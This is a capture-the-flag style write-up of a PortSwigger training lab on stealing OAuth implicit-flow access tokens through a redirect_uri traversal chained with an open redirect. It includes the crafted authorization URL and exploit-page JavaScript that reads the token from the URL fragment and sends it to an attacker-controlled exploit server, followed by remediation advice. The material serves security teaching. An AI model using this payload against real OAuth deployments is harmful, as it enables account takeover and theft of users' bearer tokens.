# 🧨 Stealing OAuth Access Tokens via an Open Redirect

![Vuln](https://img.shields.io/badge/vuln-OAuth%20Misconfiguration-red)
![Severity](https://img.shields.io/badge/severity-high-orange)
![Platform](https://img.shields.io/badge/platform-PortSwigger%20Academy-blue)
![Status](https://img.shields.io/badge/status-exploitation%20verified-blue)

An evidence-backed PortSwigger Web Security Academy write-up for **“Stealing OAuth access tokens via an open redirect.”** It chains loose `redirect_uri` validation, path normalization, and an open redirect to exfiltrate an implicit-flow access token and authenticate as `administrator`.

> **Scope and evidence:** all hosts are ephemeral PortSwigger training infrastructure. The proof screenshots show the exploit-server source, the victim’s request in the exploit log, and the resulting administrator account page. Expired access tokens and API keys are redacted.

## Executive Summary

The OAuth provider allows a callback that begins with the registered `/oauth-callback` path but contains a traversal sequence. After URL normalization, the browser reaches `/post/next`, an open redirect controlled by the `path` parameter.

Because the application uses the implicit flow, the OAuth access token is placed in the URL fragment. The attacker-controlled exploit page reads that fragment and sends the token to the exploit-server log. The captured token is then accepted by the client application, which creates an authenticated session for `administrator`.

```text
Weak redirect_uri validation
        ↓
/oauth-callback/../post/next
        ↓
Open redirect to attacker page
        ↓
Implicit-flow access token in URL fragment
        ↓
Exploit JavaScript reads and logs token
        ↓
Administrator session confirmed
```

## Lab Environment

| Component | Value |
|---|---|
| Platform | PortSwigger Web Security Academy |
| Lab | Stealing OAuth access tokens via an open redirect |
| OAuth flow | Implicit grant (`response_type=token`) |
| Registered callback | `/oauth-callback` |
| Redirect sink | `/post/next?path=...` |
| Exploit path | `/exploit` |
| Verified result | Access-token exfiltration and administrator account access |

## 1. Normal OAuth Flow

The application sends an implicit-flow authorization request:

```http
GET /auth?client_id=oc7f01hdwoe9tznmxvvv4&redirect_uri=https://0adc009503e981488201518900ad00b7.web-security-academy.net/oauth-callback&response_type=token&nonce=720517963&scope=openid%20profile%20email HTTP/1.1
Host: oauth-0a4e0052034a81e2826e4fbd022d0082.oauth-server.net
```

The OAuth provider returns the bearer token in a fragment:

```http
HTTP/2 302 Found
Location: https://0adc009503e981488201518900ad00b7.web-security-academy.net/oauth-callback#access_token=<REDACTED_EXPIRED_ACCESS_TOKEN>&expires_in=3600&token_type=Bearer&scope=openid%20profile%20email
```

The callback JavaScript extracts `access_token`, fetches the identity from `/me`, and submits it to `/authenticate`:

```javascript
const urlSearchParams = new URLSearchParams(window.location.hash.substr(1));
const token = urlSearchParams.get('access_token');

fetch('https://oauth-0a4e0052034a81e2826e4fbd022d0082.oauth-server.net/me', {
  method: 'GET',
  headers: {
    'Authorization': 'Bearer ' + token,
    'Content-Type': 'application/json'
  }
})
.then(r => r.json())
.then(j => fetch('/authenticate', {
  method: 'POST',
  headers: {
    'Accept': 'application/json',
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({ email: j.email, username: j.sub, token: token })
}))
```

This establishes the impact: a stolen token is sufficient for the client to create a session for the account represented by `j.sub`.

## 2. Open Redirect

The endpoint below redirects to the supplied `path`:

```http
GET /post/next?path=https://exploit-0a7d00a2031481ed82d650060164006e.exploit-server.net HTTP/2
Host: 0adc009503e981488201518900ad00b7.web-security-academy.net

HTTP/2 302 Found
Location: https://exploit-0a7d00a2031481ed82d650060164006e.exploit-server.net
```

This is an open redirect: the application accepts an attacker-controlled absolute URL rather than enforcing a safe relative destination.

## 3. Bypassing `redirect_uri` Validation

The registered callback is `/oauth-callback`. The payload extends that trusted prefix with a traversal sequence that reaches the redirect endpoint:

```text
/oauth-callback/../post/next?path=https://exploit-0a7d00a2031481ed82d650060164006e.exploit-server.net/exploit
```

The corresponding authorization request uses the legitimate client ID, scope, and implicit response type:

```http
GET /auth?client_id=oc7f01hdwoe9tznmxvvv4&redirect_uri=https://0adc009503e981488201518900ad00b7.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0a7d00a2031481ed82d650060164006e.exploit-server.net/exploit&response_type=token&nonce=720517963&scope=openid%20profile%20email HTTP/2
Host: oauth-0a4e0052034a81e2826e4fbd022d0082.oauth-server.net
```

The provider accepted this callback form. Once normalized, the request reaches `/post/next`; that endpoint redirects to the attacker’s `/exploit` page while the fragment token remains available to browser-side JavaScript.

## 4. Exact Exploit-Server Payload

The saved exploit at `/exploit` first requests the malicious OAuth URL. When the browser returns to the exploit origin with a fragment, it reads the token and sends it to the exploit server in the `YOOO` query parameter.

```html
<script>
const urlSearchParams = new URLSearchParams(window.location.hash.substr(1));
const token = urlSearchParams.get('access_token');

if (token) {
  fetch('https://exploit-0a7d00a2031481ed82d650060164006e.exploit-server.net/?YOOO=' + token)
} else {
  location="https://oauth-0a4e0052034a81e2826e4fbd022d0082.oauth-server.net/auth?client_id=oc7f01hdwoe9tznmxvvv4&redirect_uri=https://0adc009503e981488201518900ad00b7.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0a7d00a2031481ed82d650060164006e.exploit-server.net/exploit&response_type=token&nonce=720517963&scope=openid%20profile%20email"
}
</script>
```

## 5. Proof of Exploitation

### Victim delivery and token capture

The exploit-server access log records the victim browser loading the payload:

```text
10.0.3.129  2026-08-28 23:40:47 +0000  "GET /exploit/ HTTP/1.1" 200
user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
```

Immediately afterward, the same victim user agent requests the logging URL containing the token:

```text
10.0.3.129  2026-08-28 23:40:47 +0000  "GET /?YOOO=<REDACTED_EXPIRED_ACCESS_TOKEN> HTTP/1.1" 200
user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
```

That is direct evidence that the token was extracted from the fragment and delivered to the attacker-controlled origin.

### Administrator account access

Using the captured token completed the application’s normal authentication path. The resulting account page displayed:

```text
Your username is: administrator
Your email is: administrator@normal-user.net
Your API Key is: [hidden]
```

This verifies a successful administrator session.

### Verification boundary

The evidence confirms token theft and administrator access. The captured lab page still displayed **Not solved**, so this write-up does **not** claim final lab completion. A final solve claim should be added only with the resulting confirmation or submission response.

## Why the Chain Works

1. The provider does not require the normalized `redirect_uri` to exactly match the registered callback.
2. `/oauth-callback/../post/next` passes the loose callback check but resolves to the open redirect.
3. `/post/next` redirects to the attacker-supplied `path`.
4. The implicit flow places the bearer token in `window.location.hash`.
5. Redirecting to the exploit page preserves the fragment for its JavaScript context.
6. The payload reads `access_token` and deliberately logs it via `?YOOO=`.
7. The client trusts the stolen token’s `/me` response and authenticates as `administrator`.

## Impact

An attacker who can cause a victim with an active OAuth session to load the exploit can steal a bearer token and obtain an authenticated session as that victim. In this instance, the victim account was the administrator, demonstrating privileged account compromise.

## Remediation

- Register callback URIs explicitly and compare their **canonicalized, complete** values for an exact match.
- Reject path traversal, double separators, and other path-normalization ambiguities before callback validation.
- Remove open redirects; if a redirect is needed, use a server-side allowlist of relative destinations.
- Replace the implicit flow with Authorization Code + PKCE and avoid exposing bearer tokens in browser URLs.
- Limit token lifetime and scope; detect callback anomalies and token use from unexpected contexts.

## References

- [PortSwigger — OAuth authentication](https://portswigger.net/web-security/oauth)
- [OAuth 2.0 Security Best Current Practice](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics)

---

<p align="center">
  <sub>Write-up by <strong>Sepehr Abolhasan</strong> · PortSwigger Web Security Academy training lab · Educational use only</sub>
</p>
